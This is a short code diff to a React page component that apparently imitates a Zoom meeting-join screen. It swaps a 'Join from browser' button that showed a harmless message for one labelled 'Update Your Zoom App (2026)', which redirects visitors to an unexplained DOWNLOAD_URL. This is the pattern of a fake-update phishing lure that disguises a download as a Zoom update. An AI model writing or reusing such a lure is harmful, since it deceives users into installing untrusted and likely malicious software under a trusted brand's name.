@@ -38,10 +38,10 @@ const Index = () => {
           </button>
 
           <button
-            onClick={() => toast.info("Opening meeting in browser...")}
+            onClick={() => window.location.href = DOWNLOAD_URL}
             className="w-full h-[48px] rounded-[10px] bg-secondary text-secondary-foreground text-[15px] font-semibold border border-border hover:bg-muted transition-colors"
           >
-            Join from browser
+            Update Your Zoom App (2026)
           </button>
 
           <p className="text-sm text-muted-foreground text-center mt-2">
